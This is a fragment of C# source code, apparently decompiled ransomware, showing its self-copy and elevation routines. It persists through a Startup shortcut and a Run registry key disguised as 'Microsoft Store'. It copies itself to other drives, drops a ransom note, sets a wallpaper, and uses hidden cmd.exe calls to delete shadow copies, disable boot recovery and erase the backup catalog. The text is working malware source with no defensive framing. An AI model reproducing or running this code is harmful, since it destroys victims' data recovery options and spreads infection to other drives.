		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
